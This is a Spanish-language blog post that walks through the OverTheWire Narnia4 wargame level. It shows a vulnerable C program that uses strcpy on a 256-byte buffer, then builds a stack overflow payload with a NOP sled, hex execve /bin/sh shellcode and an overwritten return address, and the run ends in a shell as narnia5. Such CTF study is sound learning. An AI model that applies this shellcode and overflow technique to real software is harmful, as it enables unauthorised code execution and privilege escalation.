---
layout: default
---

## OverTheWire: Narnia4
`10-4-2021 11:05AM`

Hola a todos!

Bienvenidos al desafío final de esta serie de posts, estaremos explotando otro Buffer Overflow para hacer estallar una shell, así que te recomiendo que regreses y te asegures de comprender los conceptos básicos con el desafío 2.

Tenemos el siguiente código fuente:

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256]; /*Defines the buffer length*/

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]); /*Copies the argument to the buffer (vulnerable)*/

    return 0;
}
```

Podemos comenzar obteniendo nuestro relleno, sabemos que el tamaño del buffer es 256, por lo que podemos comenzar con eso, luego necesitamos nuestra dirección de retorno, para que podamos ejecutar: `ltrace ./narnia4 $(python -c 'print "A"*300')` y luego obtener la dirección a la que strcpy iba a copiar las A en (en mi caso fue a 0xffffd4d4), por lo que tenemos nuestro relleno, dirección de retorno y podemos reutilizar el shellcode del desafío 2, que tiene 28 bytes de longitud.

Nuestra payload se verá algo así en este momento:

```
./narnia4 $(python -c 'print "\x90"*256 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\ x80" + "\xd4\xd4\xff\xff"*4')
```

Para aclarar, he convertido la dirección de retorno a formato little endian (0xffffd4d4 -> \xd4\xd4\xff\xff), y la he hecho aparecer cuatro veces consecutivas en el payload para aumentar las posibilidades de que caiga en el lugar correcto, finalmente, reemplacé las "A" con \x90 o sin bytes de operación, por lo que la máquina omitirá esos bytes hasta que alcance nuestro shellcode.

Esto no funcionará, ya que hay una dirección de 4 bytes entre el final del buffer y el inicio de la dirección de retorno, por lo que necesitamos agregar 4 bytes a nuestro relleno, lo que lo convierte en 260.

Nuestra hazaña final es:

```
./narnia4 $(python -c 'print "\x90"*260 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4') # YOUR RETURN ADDRESS MAY VARY
```

Y cuando lo ejecutamos:

```
narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print "\x90"*(260 - 28) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\
x80" + "\xd4\xd4\xff\xff"*4')
$ whoami
narnia5
```

Listo! Y ya hemos terminado con esta serie de reto, les exhorto a seguir aprendiendo de pwn y haciendo más retos como estos
